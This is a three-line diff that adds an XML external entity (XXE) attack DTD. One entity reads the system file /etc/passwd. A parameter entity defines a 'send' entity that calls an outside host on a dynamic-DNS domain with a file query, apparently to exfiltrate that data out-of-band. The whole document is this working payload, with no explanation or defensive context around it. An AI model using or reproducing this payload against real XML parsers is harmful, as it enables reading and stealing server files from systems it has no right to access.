@@ -1,0 +1,3 @@
+<!ENTITY  xxe SYSTEM "file:///etc/passwd" >
+<!ENTITY % all "&#x3C;!ENTITY send SYSTEM 'http://mu27062382.zicp.vip:35621/XXE/1.php?file=yojgk' &#x3E;" >
+
